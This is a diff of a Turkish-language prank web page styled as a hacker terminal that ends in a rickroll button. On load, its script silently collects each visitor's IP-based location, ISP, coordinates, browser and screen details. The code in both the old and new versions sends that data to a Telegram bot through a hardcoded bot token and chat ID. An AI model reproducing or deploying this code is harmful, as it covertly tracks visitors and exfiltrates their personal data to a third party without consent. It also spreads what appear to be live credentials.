@@ -11,42 +11,56 @@
       font-family: monospace, monospace;
       overflow: hidden;
       display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #container {
+      width: 90vw;
+      max-width: 800px;
+      height: 90vh;
+      background-color: black;
+      border-radius: 8px;
+      padding: 10px 15px;
+      box-sizing: border-box;
+      overflow: hidden;
+      box-shadow: 0 0 20px #00ff00;
+      white-space: pre-wrap;
+      user-select: none;
+      display: flex;
       flex-direction: column;
     }
     #terminal {
-      height: 350px; /* BÜYÜK terminal */
+      flex: none;
+      height: 62vh;
       overflow-y: auto;
-      font-size: 14px;
+      margin-bottom: 8px;
+      font-size: 13px;
       line-height: 1.3;
-      padding: 10px 15px;
-      border-bottom: 1px solid #00ff00;
-      white-space: pre-wrap;
-      user-select: none;
-      box-sizing: border-box;
     }
     #rickrollButton {
       background: #00ff00;
       color: black;
-      padding: 10px 20px;
+      padding: 14px 35px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       font-weight: bold;
       cursor: pointer;
       user-select: none;
       font-size: 18px;
       align-self: center;
-      margin: 5px 0;
-      box-shadow: 0 0 10px #00ff00;
-      display: none;
+      transition: background 0.3s ease;
+      box-shadow: 0 0 15px #00ff00;
+      margin-bottom: 8px;
+    }
+    #map {
+      flex: 0 0 25vh;
+      border: 2px solid #00ff00;
+      border-radius: 6px;
+      background: #111;
     }
     #rickrollButton:hover {
       background: #00cc00;
-      box-shadow: 0 0 20px #00ff00;
-    }
-    #map {
-      flex: 1 1 auto; /* kalan alan harita */
-      border-top: 2px solid #00ff00;
-      background: #111;
+      box-shadow: 0 0 25px #00ff00;
     }
     .leaflet-container {
       background: #111 !important;
@@ -60,27 +74,24 @@
     }
   </style>
 
-  <!-- Leaflet CSS -->
   <link
     rel="stylesheet"
     href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
   />
 </head>
 <body>
-  <pre id="terminal"></pre>
-  <button id="rickrollButton">Sürpriz İçin Tıkla</button>
-  <div id="map"></div>
+  <div id="container">
+    <pre id="terminal"></pre>
+    <button id="rickrollButton" style="display:none;">Sürpriz İçin Tıkla</button>
+    <div id="map"></div>
+  </div>
 
-  <!-- Leaflet JS -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
 
   <script>
     const terminal = document.getElementById('terminal');
     const button = document.getElementById('rickrollButton');
     let map;
-
-    const TELEGRAM_BOT_TOKEN = '8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';
-    const TELEGRAM_CHAT_ID = '6400737507';
 
     function logToTerminal(text) {
       terminal.textContent += text + '\n';
@@ -124,7 +135,7 @@
           org: data.org || 'Bilinmiyor',
           postal: data.postal || 'Bilinmiyor'
         };
-      } catch (error) {
+      } catch {
         return {
           latitude: 41.0082,
           longitude: 28.9784,
@@ -138,31 +149,39 @@
       }
     }
 
-    async function sendToTelegram(message) {
-      try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-          })
-        });
-        logToTerminal(`[${getCurrentTime()}] Bilgiler Telegram'a gönderildi.`);
-      } catch (e) {
-        logToTerminal(`[${getCurrentTime()}] Telegram gönderim hatası: ${e.message}`);
-      }
+    // Telegram mesaj gönderme fonksiyonu
+    function sendTelegramMessage(message) {
+      const chatId = '640073750';
+      const botToken = '78059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Telegram mesajı gönderildi.');
+        } else {
+          console.error('Telegram mesaj gönderilemedi:', data);
+        }
+      })
+      .catch(error => console.error('Telegram API hatası:', error));
     }
 
     async function collectData() {
       logToTerminal(`[${getCurrentTime()}] Sistem başlatılıyor...`);
-      logToTerminal('');
-
       const locationData = await getLocationData();
+
       const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);
 
-      const infoMessage = `<b>Konum Bilgileri:</b>\n` +
+      const infoMessage = 
+        `Konum Bilgileri:\n` +
         `IP: ${locationData.ip}\n` +
         `Şehir: ${locationData.city}\n` +
         `Bölge: ${locationData.region}\n` +
@@ -171,28 +190,28 @@
         `ISP: ${locationData.org}\n` +
         `Koordinatlar: ${coordsFormatted}\n\n` +
 
-        `<b>Tarayıcı Bilgileri:</b>\n` +
+        `Tarayıcı Bilgileri:\n` +
         `User Agent: ${navigator.userAgent}\n` +
         `Dil: ${navigator.language}\n` +
         `Platform: ${navigator.platform}\n` +
         `Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
         `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +
 
-        `<b>Ekran Bilgileri:</b>\n` +
+        `Ekran Bilgileri:\n` +
         `Çözünürlük: ${screen.width}x${screen.height}\n` +
         `Renk Derinliği: ${screen.colorDepth}\n` +
         `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
         `Şu anki Saat: ${getCurrentTime()}`;
 
-      logToTerminal(infoMessage.replace(/<[^>]+>/g, ''));
-
-      await sendToTelegram(infoMessage);
+      logToTerminal(infoMessage);
 
       showMap(locationData.latitude, locationData.longitude, locationData);
 
-      logToTerminal('');
+      // Telegram'a gönder
+      sendTelegramMessage(infoMessage);
+
       logToTerminal(`[${getCurrentTime()}] Sistem hazır!`);
-      button.style.display = 'inline-block';
+      addButton();
     }
 
     function showMap(lat, lon, locationData) {
@@ -218,29 +237,27 @@
           .bindPopup(popupContent)
           .openPopup();
 
-        setTimeout(() => {
-          map.invalidateSize();
-        }, 100);
+        setTimeout(() => map.invalidateSize(), 100);
+
       } catch (error) {
         logToTerminal(`[${getCurrentTime()}] Harita yüklenirken hata: ${error.message}`);
       }
     }
 
-    button.onclick = () => {
-      logToTerminal(`[${getCurrentTime()}] Sürpriz butonuna tıklandı!`);
-      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
-    };
+    function addButton() {
+      button.style.display = 'inline-block';
+      button.onclick = () => {
+        logToTerminal(`[${getCurrentTime()}] Sürpriz butonuna tıklandı!`);
+        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
+      };
+    }
 
     window.addEventListener('load', () => {
       setTimeout(collectData, 500);
     });
 
     window.addEventListener('resize', () => {
-      if (map) {
-        setTimeout(() => {
-          map.invalidateSize();
-        }, 100);
-      }
+      if (map) setTimeout(() => map.invalidateSize(), 100);
     });
   </script>
 </body>
